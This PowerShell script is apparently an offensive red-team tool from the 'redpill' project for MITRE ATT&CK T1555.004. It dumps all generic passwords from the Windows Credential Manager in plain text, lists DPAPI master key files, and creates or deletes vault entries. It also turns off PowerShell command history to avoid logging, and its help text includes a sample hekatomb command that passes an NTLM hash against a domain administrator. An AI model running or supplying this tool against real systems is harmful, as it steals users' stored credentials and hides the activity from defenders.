<#
.SYNOPSIS
   Manage Windows Password Vault Items

   Author: @r00t-3xp10it
   Tested Under: Windows 10 (19044) x64 bits
   Required Dependencies: VaultSvc
   Optional Dependencies: VaultCmd
   PS cmdlet Dev version: v1.0.8
   
.DESCRIPTION
   Manage Windows Password Vault Items

.NOTES
   This cmdlet only creates or dumps credentials with
   [Generic passwords] It will not decode DPAPI creds.
   Warning: Parameter 'resource' and 'username' are
   required to delete entrys from Password Vault.

.Parameter Action
   Check, Create, Dump, DPAPI, Delete (default: help) 

.Parameter Resource
   Resource or Url (default: https://www.siliconvalley/classified.portal)

.Parameter UserName
   Credential username (default: DOMAIN\USERNAME)

.Parameter Password
   Credential password (defaut: r00t3xp10it)

.Parameter Help
   Description of MITRE ATT&CK T1555.004

.EXAMPLE
   PS C:\> .\Invoke-VaultCmd.ps1 -action check
   Check for stored Resource_names with creds

.EXAMPLE
   PS C:\> .\Invoke-VaultCmd.ps1 -action create -resource "MyCredential" -username "SKYNET\pedro" -password "r00t3xp10it"
   Create new vault entry named 'MyCredential' with 'SKYNET\pedro' username and 'r00t3xp10it' as is access password

.EXAMPLE
   PS C:\> .\Invoke-VaultCmd.ps1 -action dump
   Dump ALL generic passwords [plain text] from vault

.EXAMPLE
   PS C:\> .\Invoke-VaultCmd.ps1 -action DPAPI
   Dump raw DPAPI master keys (un-decoded)

.EXAMPLE
   PS C:\> .\Invoke-VaultCmd.ps1 -action delete -resource "MyCredential" -username "BillGates"
   Delete resource 'MyCredential' with 'BillGates' username and comrrespondent creds from vault

.INPUTS
   None. You cannot pipe objects into Invoke-VaultCmd.ps1

.OUTPUTS
   [vault] Manage Windows Vault Entrys.
   [vault] Scanning for credential tokens

   Currently loaded vaults:
           Vault: Credenciais Web
           Vault Guid:4BF4C442-9B8A-41A0-B380-DD4A704DDB28
           Location: C:\Users\pedro\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28

           Vault: Credenciais do Windows
           Vault Guid:77BC582B-F0A6-4E15-4E80-61736B6F3B29
           Location: C:\Users\pedro\AppData\Local\Microsoft\Vault

   Secret Vault Name             Resource
   ------ ----------             --------
   DPAPI  Credenciais Web        https://Microsoft/land.com
   DPAPI  Credenciais Web        https://Silliconvalley/log.org
   DPAPI  Credenciais do Windows Domain:interactive=SKYNET\pedro
   DPAPI  Credenciais do Windows Domain:interactive=SKYNET\administrator

   UserName         Resource                      Password Type
   --------         --------                      -------------
   Domain\billGates https://Microsoft/land.com    Hidden::Generic
   SKYNET\pedro     http://Silliconvalley/log.org Hidden::Generic

.LINK
   https://github.com/r00t-3xp10it/redpill/tree/main/lib
   https://sites.utexas.edu/glenmark/2019/10/21/using-passwordvault-with-powershell
#>


[CmdletBinding(PositionalBinding=$false)] param(
   [string]$Resource="https://www.siliconvalley/classified.portal",
   [string]$UserName="${Env:COMPUTERNAME}\${Env:USERNAME}",
   [string]$Password="r00t3xp10it",
   [string]$Action="help",
   [string]$Banner="true",
   [switch]$Help
)


Clear-Host
$StartBanner = @"

(                                                           
)\ )                           (                    (    )  
(()/(   )       (  (       (    )\ ) (   (    )   (  )\( /(  
/(_)| /( (  (  )\))(   (  )(  (()/( )\  )\( /(  ))\((_)\()) 
(_)) )(_)))\ )\((_)()\  )\(()\  ((_)|(_)((_)(_))/((_)_(_))/  
| _ ((_)_((_|(_)(()((_)((_)((_) _| |\ \ / ((_)_(_))(| | |_   
|  _/ _  (_-<_-< V  V / _ \ '_/ _  | \ V // _  | || | |  _|  
|_| \__,_/__/__/\_/\_/\___/_| \__,_|  \_/ \__,_|\_,_|_|\__| 
"@;
If($Banner -iMatch "true")
{
   write-host $StartBanner -ForegroundColor DarkRed
   write-host "    * GitHub: https://github.com/r00t-3xp10it/redpill *" -ForegroundColor DarkYellow
   Start-Sleep -Milliseconds 500
}


$Names = @()
$CmdletVersion = "v1.0.8"

## Build Output Table Object
$VaultEntrys = New-Object System.Data.DataTable
$VaultEntrys.Columns.Add("Secret")|Out-Null
$VaultEntrys.Columns.Add("Vault Name")|Out-Null
$VaultEntrys.Columns.Add("Resource")|Out-Null

$ErrorActionPreference = "SilentlyContinue"
## Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
write-host "`n[vault] Manage Windows Vault Entrys." -ForegroundColor Green
$host.UI.RawUI.WindowTitle = "@Invoke-VaultCmd $CmdletVersion {SSA@RedTeam}"

## Make sure mandatory parameter is correct set
If($Action -iNotMatch '^(Help|Check|Create|Dump|DPAPI|Delete)$')
{
   write-host "[vault] wrong parameter (" -ForegroundColor Red -NoNewline
   write-host "$Action" -ForegroundColor DarkYellow -NoNewline
   write-host ") user input.`n" -ForegroundColor Red
   return
}

## Make sure service VaultSvc is running
If((Get-Service -Name "VaultSvc").Status -iNotMatch '^(Running)$')
{
   write-host "[vault] Cmdlet requires (" -ForegroundColor Red -NoNewline
   write-host "VaultSvc" -ForegroundColor DarkYellow -NoNewline
   write-host ") service running.`n" -ForegroundColor Red
   return
}


$Secret = @()
## Initializing the PasswordVault Object
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
$vault = New-Object Windows.Security.Credentials.PasswordVault

$Schemas = $(VaultCmd /list|findstr "Vault:") -replace '^\s*Vault: ',''
ForEach($Token in $Schemas)
{
   ## List credentials existence with VaultCmd builtin software
   $Names = (vaultcmd /listcreds:"$Token" /all|findstr "Resource") -replace 'Resource: ',''
   $Secret = (VaultCmd /listproperties:"$Token"|findstr "Current protection method:") -replace 'Current protection method: ',''

   ForEach($Item in $Names)
   {
      ## Add entrys found to Table
      $VaultEntrys.Rows.Add("$Secret","$Token","$Item")|Out-Null
   }
}


If($Action -iMatch '^(check)$')
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Scanning for credential tokens

   .OUTPUTS
      [vault] Manage Windows Vault Entrys.
      [vault] Scanning for credential tokens

      Currently loaded vaults:
              Vault: Credenciais Web
              Vault Guid:4BF4C442-9B8A-41A0-B380-DD4A704DDB28
              Location: C:\Users\pedro\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28

              Vault: Credenciais do Windows
              Vault Guid:77BC582B-F0A6-4E15-4E80-61736B6F3B29
              Location: C:\Users\pedro\AppData\Local\Microsoft\Vault

      Secret Vault Name             Resource
      ------ ----------             --------
      DPAPI  Credenciais Web        http://Silliconvalley/log.org
      DPAPI  Credenciais do Windows Domain:interactive=SKYNET\pedro
      DPAPI  Credenciais do Windows Domain:interactive=SKYNET\administrator

      UserName     Resource                      Password Type
      --------     --------                      -------------
      SKYNET\pedro http://Silliconvalley/log.org Hidden::Generic
   #>

   write-host "[vault] " -ForegroundColor Green -NoNewline
   write-host "Scanning for credential tokens`n"

   VaultCmd /list ## Currently loaded vaults
   ## Print OnScreen existing creds (DPAPI + GENERIC) inside passwordvault
   $VaultEntrys | Format-Table -AutoSize | Out-String -Stream | Select-Object -SkipLast 2

   Start-Sleep -Milliseconds 900
   ## Check if vault contains any Generic creds
   If(($vault.RetrieveAll()) -ne $null)
   {
      ## Use GUI ??? Or Format-Table outputs?
      # $vault.RetrieveAll() | Out-GridView -title "credentials dump"
      $vault.RetrieveAll() | Select-Object Username,Resource,@{Name='Password Type';Expression={"Hidden::Generic"}} |
         Out-String -Stream | Select-Object -SkipLast 1
   }
   Else
   {
      write-host "`n[vault] none valid credentials to decode found inside vault.`n" -ForegroundColor Red
   }
}


If($Action -iMatch '^(create)$')
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Create credential with Generic password

   .OUTPUTS
      [vault] Manage Windows Vault Entrys.
      [vault] Creating https://siliconvalley/Classified.portal credential

      UserName     Resource                                Password Type
      --------     --------                                -------------
      SKYNET\pedro https://siliconvalley/Classified.portal Hidden::Generic
   #>

   write-host "[vault] " -ForegroundColor Green -NoNewline
   write-host "Creating " -NoNewline
   write-host "$Resource" -ForegroundColor DarkYellow -NoNewline
   write-host " credential`n"

   ## Make sure mandatory param its set
   If([string]::IsNullOrEmpty($Resource))
   {
      write-host "[vault] Error: missing -resource parameter input.`n" -ForegroundColor Red
      return
   }

   ## Make sure 'Resource name' and 'Username' to create does NOT exist in vault 
   If([bool]($vault.RetrieveAll()|Where-Object{$_.Resource -eq "$Resource" -and $_.UserName -eq "$UserName"}) -Match "True")
   {
      ## Print OnScreen existing creds (DPAPI + GENERIC) inside passwordvault
      $VaultEntrys | Format-Table -AutoSize | Out-String -Stream | Select-Object -Skip 1 | Select-Object -SkipLast 1

      Start-Sleep -Milliseconds 1100
      ## Print OnScreen existing 'usernames' with 'resource' names associated.
      $vault.RetrieveAll() | Select-Object Username,Resource,@{Name='Password Type';Expression={"Hidden::Generic"}} |
         Out-String -Stream | Select-Object -Skip 1 | Select-Object -SkipLast 1

         write-host "[vault] Error: " -ForegroundColor Red -NoNewline
         write-host "$Resource" -ForegroundColor DarkYellow -NoNewline
         write-host " with username " -ForegroundColor Red -NoNewline
         write-host "$UserName" -ForegroundColor DarkYellow -NoNewline
         write-host " exists.`n" -ForegroundColor Red
         return          
   }

   ## Create unique credential ObjectAPI
   $cred = New-Object windows.Security.Credentials.PasswordCredential
   $cred.Resource = "$Resource"
   $cred.UserName = "$UserName"
   $cred.Password = "$Password"
   $vault.Add($cred)

   Start-Sleep -Milliseconds 800
   # ReView credential existance now
   If(($vault.RetrieveAll()) -ieq $null)
   {
      write-host "[vault] Error: fail to create: $Resource.`n" -ForegroundColor Red
   }
   Else
   {
      ## Print OnScreen just the recent created credential info
      $titanio = ($vault.RetrieveAll()).UserName|Where-Object{$_ -iMatch "$Username"}
      $vault.RetrieveAll() | Where-Object { $_.Resource -iMatch "^($REsource)$" -and $_.UserName -iMatch "$titanio"} |
         Select-Object -Property UserName,Resource,@{Name='Password Type';Expression={"Hidden::Generic"}} |
         Out-String -Stream | Select-Object -Skip 1 | Select-Object -SkipLast 1
   }

   ## Variable CleanUp
   Remove-Variable cred
}


If($Action -iMatch '^(dump)$')
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Dump plain text [Generic passwords] creds

   .NOTES
      This function dumps ALL generic passwords found

   .OUTPUTS
      Currently loaded vaults:
            Vault: Credenciais Web
            Vault Guid:4BF4C442-9B8A-41A0-B380-DD4A704DDB28
            Location: C:\Users\pedro\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28

            Vault: Credenciais do Windows
            Vault Guid:77BC582B-F0A6-4E15-4E80-61736B6F3B29
            Location: C:\Users\pedro\AppData\Local\Microsoft\Vault

    Secret Vault Name             Resource
    ------ ----------             --------
    DPAPI  Credenciais Web        https://siliconvalley/Classified.portal
    DPAPI  Credenciais do Windows Domain:interactive=SKYNET\pedro
    DPAPI  Credenciais do Windows Domain:interactive=SKYNET\administrator

    UserName     Resource                                Password
    --------     --------                                --------
    SKYNET\pedro https://siliconvalley/Classified.portal r00t3xp10it
   #>

   write-host "[vault] " -ForegroundColor Green -NoNewline
   write-host "Retrieving plain text credentials`n" 

   VaultCmd /list ## Currently loaded vaults
   ## Print OnScreen existing creds (DPAPI + GENERIC) inside passwordvault
   $VaultEntrys | Format-Table -AutoSize | Out-String -Stream | Select-Object -SkipLast 1

   Start-Sleep -Milliseconds 800
   ## Check if we have any credentials to display
   $CheckForCredentials = $vault.RetrieveAll()
   If([string]::IsNullOrEmpty($CheckForCredentials))
   {
      write-host "[Vault] none valid credentials to decode found inside vault.`n" -ForegroundColor Red
      return
   }

   ## Dump ALL valid credentials [Generic] in plain text 
   $vault.RetrieveAll() | % { $_.RetrievePassword(); $_ } |
      Select-Object -Property UserName,Resource,Password | Format-Table -AutoSize |
      Out-String -Stream | Select-Object -Skip 1 | Select-Object -SkipLast 1
}


If($Action -iMatch '^(delete)$')
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Delete Resource name from vault

   .NOTES
      Parameters 'resource' and 'username' are
      mandatory to successfull delete entrys..

   .OUTPUTS
      Currently loaded vaults:
            Vault: Credenciais Web
            Vault Guid:4BF4C442-9B8A-41A0-B380-DD4A704DDB28
            Location: C:\Users\pedro\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28

            Vault: Credenciais do Windows
            Vault Guid:77BC582B-F0A6-4E15-4E80-61736B6F3B29
            Location: C:\Users\pedro\AppData\Local\Microsoft\Vault

    Secret Vault Name             Resource
    ------ ----------             --------
    DPAPI  Credenciais Web        https://siliconvalley/Classified.portal
    DPAPI  Credenciais do Windows Domain:interactive=SKYNET\pedro
    DPAPI  Credenciais do Windows Domain:interactive=SKYNET\administrator

    UserName     Resource                                State
    --------     --------                                -----
    SKYNET\pedro https://siliconvalley/Classified.portal Deleted
   #>

   write-host "[vault] " -ForegroundColor Green -NoNewline
   write-host "Deleting '$Resource' from vault.`n"

   VaultCmd /list ## Currently loaded vaults
   ## Print OnScreen existing creds (DPAPI + GENERIC) inside passwordvault
   $VaultEntrys | Format-Table -AutoSize | Out-String -Stream | Select-Object -SkipLast 1

   ## Make sure 'Resource name' + 'Username' to delete exists in vault 
   If([bool]($vault.RetrieveAll()|Where-Object{$_.Resource -eq "$Resource" -and $_.UserName -eq "$UserName"}) -Match "False")
   {
      Start-Sleep -Milliseconds 800
      ## Print OnScreen existing 'usernames' with 'resource' names associated.
      $vault.RetrieveAll() | Select-Object Username,Resource,@{Name='Password Type';Expression={"Hidden::Generic"}} |
         Out-String -Stream | Select-Object -Skip 1 | Select-Object -SkipLast 1

      write-host "[vault] not found: " -ForegroundColor Red -NoNewline
      write-host "$Resource" -ForegroundColor DarkYellow -NoNewline
      write-host " with username " -ForegroundColor Red -NoNewline
      write-host "$UserName`n" -ForegroundColor DarkYellow
      return          
   }

   #Removing Unique Credential API
   $cred = New-Object Windows.Security.Credentials.PasswordCredential
   $cred.Resource = "$Resource"
   $cred.UserName = "$UserName"
   $vault.Remove($cred)

   Start-Sleep -Milliseconds 1200
   ## Make sure 'Resource name' and 'Username' to delete exists in vault 
   If([bool]($vault.RetrieveAll()|Where-Object{$_.Resource -eq "$Resource" -and $_.UserName -eq "$UserName"}) -Match "True")
   {
      write-host "[vault] fail to delete " -ForegroundColor Red -NoNewline
      write-host "$Resource`n" -ForegroundColor DarkYellow -NoNewline

      write-host "[vault] " -ForegroundColor Red -NoNewline
      write-host "review " -NoNewline
      write-host "$Username" -ForegroundColor DarkYellow -NoNewline
      write-host " and " -NoNewline
      write-host "$Resource" -ForegroundColor DarkYellow -NoNewline
      write-host " parameters.`n"
      return          
   }
   Else
   {
      $DeleteUserNam = $cred.UserName
      $Results = [PSCustomObject]@{
         UserName = "$DeleteUserNam"
         Resource = "$Resource"
         State = "deleted"
      }

      ## Colorize the output Table
      $Results | Out-String -Stream | Select-Object -Skip 1 |  Select-Object -SkipLast 1    
   }

   ## Variable CleanUp
   Remove-Variable cred
}


If($Action -iMatch '^(DPAPI)$')
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Dump DPAPI Master Keys

   .NOTES
      This function dumps DPAPI Master
      Keys, but it will NOT decode them.

   .OUTPUTS
      [vault] Manage Windows Vault Entrys.
      [vault] Dumping 'DPAPI' master keys.

      Currently loaded vaults:
              Vault: Credenciais Web
              Vault Guid:4BF4C442-9B8A-41A0-B380-DD4A704DDB28
              Location: C:\Users\pedro\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28

              Vault: Credenciais do Windows
              Vault Guid:77BC582B-F0A6-4E15-4E80-61736B6F3B29
              Location: C:\Users\pedro\AppData\Local\Microsoft\Vault

              DPAPI master keys
              78D8FB08F793E5AD42292B24ED3E4964
              D3DA1BB8B5BFC56D5A4B45A6742DA77B
              013F80D38C8D6E1BE9B8016C42A9BAF1
              44FA1CD26A1DFBD511746C2C6A7ABE92
              A9A234BA5084491E0EEA7FB1DD5ACB27
              DFBE70A7E5CC19A398EBF1B96859CE5D

      [pvk archives] C:\Users\pedro\AppData\Roaming\Microsoft\Protect\S-1-5-21-303954997-3777458861-170123188-1001\uhdfsrphs.pvk
      [decodehashes] hekatomb -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug
   #>

   $i = 0
   write-host "[vault] " -ForegroundColor Green -NoNewline
   write-host "Dumping 'DPAPI' master keys.`n"
   VaultCmd /list ## Currently loaded vaults

   Start-Sleep -Milliseconds 800
   ## Dump DPAPI master keys function
   $Location = "$env:USERPROFILE\AppData\Roaming\Microsoft\Protect"
   $Dpapi1 = (Get-ChildItem -Path "$Env:APPDATA\Microsoft\Credentials" -Attributes Hidden -Force -EA SilentlyContinue).Name
   $Dpapi2 = (Get-ChildItem -Path "$Env:LOCALAPPDATA\Microsoft\Credentials" -Attributes Hidden -Force -EA SilentlyContinue).Name
   If($Dpapi1 -ne $null -or $Dpapi2 -ne $null)
   {
      write-host "        DPAPI master keys" -ForegroundColor Green
      $line1 = $Dpapi1[0];$key1 = "        "+"$line1" -join ''
      $line2 = $Dpapi1[1];$key2 = "        "+"$line2" -join ''
      $line3 = $Dpapi1[2];$key3 = "        "+"$line3" -join ''
      $line4 = $Dpapi1[3];$key4 = "        "+"$line4" -join ''
      If($line1){echo $key1};If($line2){echo $key2};
      If($line3){echo $key3};If($line4){echo $key4};
      ## LOCALAPPDATA dpapi keys
      $line5 = $Dpapi2[0];$key5 = "        "+"$line5" -join ''
      $line6 = $Dpapi2[1];$key6 = "        "+"$line6" -join ''
      $line7 = $Dpapi2[2];$key7 = "        "+"$line7" -join ''
      $line8 = $Dpapi2[3];$key8 = "        "+"$line8" -join ''
      $line9 = $Dpapi2[4];$key9 = "        "+"$line9" -join ''
      If($line5){echo $key5};If($line6){echo $key6};
      If($line7){echo $key7};If($line8){echo $key8};
      If($line9){echo $key9};
      write-host ""


      ## Dump FullPath - SID - GUID
      $MasterKeySSID = (Get-ChildItem -Path "$Location").FullName
      $UserName_SSID = $MasterKeySSID.Split('\\')[-1]

      write-host "        [" -NoNewline
      write-host "SSID" -ForegroundColor Green -NoNewline
      write-host "]::" -NoNewline
      write-host "$UserName_SSID" -ForegroundColor Red
      write-host "        [" -NoNewline
      write-host "PATH" -ForegroundColor Green -NoNewline
      write-host "]::" -NoNewline
      write-host "$Location"

      ## Loop trougth all items in SID
      ForEach($Item in $MasterKeySSID)
      {
         ## Searching for GUID file types inside SID directory
         $GUID = ((Get-ChildItem -Path "$Item"|Select-Object *)).FullName
         If(-not([string]::IsNullOrEmpty($GUID)))
         {
            $i = $i + 1 ## GUID success
            ForEach($AuthToken in $GUID)
            {
               ## Grab GUID name from fullpath
               $GrabGuid = $AuthToken.Split('\\')[-1]
               $Sanitize = $AuthToken -replace "$GrabGuid",""

               write-host "        [" -NoNewline
               write-host "GUID" -ForegroundColor Green -NoNewline
               write-host "]::" -NoNewline
               write-host "$Sanitize" -NoNewline
               write-host "$GrabGuid" -ForegroundColor Red

            }
         }
      }

      If($i -lt 1)
      {
         ## Fail to find any creds [GUID]
         write-host "        [" -NoNewline
         write-host "GUID" -ForegroundColor Red -NoNewline
         write-host "]::" -NoNewline
         write-host "Fail to find any credentials [GUID] inside path."
      }

      $FinalTime = Get-Date -Format "HH:mm:ss"
      write-host "`n[vault] " -ForegroundColor Green -NoNewLine
      write-host "$FinalTime" -ForegroundColor DarkGray -NoNewLine
      write-host " - module finished dumping secrets ..`n"
   }
   Else
   {
      write-host "[vault] none DPAPI master keys found on $Env:USERDOMAIN system?`n" -ForegroundColor Red
      return
   }

}


If($Help.IsPresent -or $Action -iMatch "^(help)$")
{

<#
.SYNOPSIS
   Author: @r00t-3xp10it
   Helper - MITRE ATT&CK T1555.004 description
#>

write-host "`n  MITRE ATT&CK T1555.004" -ForegroundColor Green
write-host "  Dumping credentials from Password Stores" -ForegroundColor DarkGreen

$DetailHelp = @"
  The Credential Manager stores credentials for signing into websites, applications and
  or devices that request authentication through NTLM or Kerberos in Credential Lockers.

  The Windows Credential Manager separates website credentials from application or network
  credentials in two lockers. Credentials from Web Browsers, Internet Explorer and Microsoft
  Edge websites are managed by the Credential Manager and are stored in the Web Credentials
  locker, Application and network credentials are stored in the Windows Credentials locker.

  Adversaries may list credentials managed by the Windows Credential Manager through several
  mechanisms. The vaultcmd.exe is a native Windows executable that can be abused to enumerate,
  create or delete credentials stored in the Credential Locker through a command-line interface.

"@
write-host $DetailHelp -ForegroundColor DarkGray
write-host "  CMDLET DETAILED INFO" -ForegroundColor DarkGreen
write-host "  Get-Help .\Invoke-VaultCmd.ps1 -full" -ForegroundColor DarkGray

write-host "`n  PROJECT COMTRIBUTIONS" -ForegroundColor DarkGreen
write-host "  @ShantyDamayanti" -ForegroundColor DarkGray
write-host "  @D1rkMtr`n" -ForegroundColor DarkGray
exit
}